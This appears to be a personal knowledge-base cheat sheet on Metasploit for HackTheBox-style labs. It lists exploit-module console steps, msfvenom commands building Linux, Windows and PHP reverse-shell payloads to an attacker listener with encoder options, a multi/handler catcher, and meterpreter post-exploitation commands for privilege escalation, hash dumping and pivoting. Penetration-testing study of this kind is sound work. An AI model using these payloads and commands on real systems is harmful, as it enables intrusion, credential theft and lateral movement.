---
summary: Metasploit + msfvenom — module workflow, payloads, meterpreter, handlers.
status: active
tags: [security, tools, metasploit, payloads]
private: false
---

# Metasploit

Exploit framework. Use it deliberately — on HTB, prefer manual exploitation for learning, but msfvenom + multi/handler are always handy.

## Console workflow

```
msfconsole -q
search type:exploit <service/cve>
use exploit/<path>
info                 # what it does, targets
show options; set RHOSTS $IP; set LHOST tun0; set LPORT 443
set payload <payload>; show targets; set target <n>
check                # verify vuln without firing (when supported)
run                  # or exploit
```

Sessions: `sessions -l`, `sessions -i 1`, `background` (Ctrl-Z).

## msfvenom (standalone payloads)

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp   LHOST=tun0 LPORT=443 -f elf -o s.elf
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f exe -o s.exe
msfvenom -p php/reverse_php LHOST=tun0 LPORT=443 -f raw -o sh.php
msfvenom -l payloads | grep <os>            # list
# encode/avoid bad chars: -e x86/shikata_ga_nai -b '\x00' -i 5
```

## Catch any shell (even manual payloads)

```
use exploit/multi/handler
set payload <matching payload>; set LHOST tun0; set LPORT 443; run
```

## meterpreter essentials

`getuid` · `sysinfo` · `shell` · `download/upload` · `getsystem` (Win privesc) · `hashdump` · `run post/multi/recon/local_exploit_suggester` · `portfwd add -l 8080 -r 127.0.0.1 -p 3000` (pivot).

## Related

- [Metasploit tool index](kb://11-security-tools-tools-index)
- [Reverse Shells & Payloads](kb://11-security-playbook-reverse-shells)
